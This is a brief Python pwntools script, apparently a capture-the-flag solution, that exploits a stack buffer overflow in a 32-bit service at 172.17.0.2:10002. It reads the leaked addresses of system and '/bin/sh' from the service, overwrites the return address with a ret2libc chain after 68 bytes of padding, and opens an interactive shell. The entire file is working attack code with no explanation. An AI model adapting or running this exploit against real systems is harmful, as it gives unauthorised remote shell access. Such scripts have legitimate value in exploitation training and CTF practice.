from pwn import process, remote
import struct
import sys

#target = process("./two.o")
target = remote("172.17.0.2", 10002)

target.recvline()

message = target.recvline().decode("utf-8").split()
system = int(message[2].strip(','), 16)
binsh = int(message[5], 16)
ret = 0xffffffff # arbitrary return address, a call to system would push a return address

padding = b'\x41' * 68
payload = padding + struct.pack("<L", system) + struct.pack("<L", ret) + struct.pack("<L", binsh)

target.sendline(payload)
target.interactive()
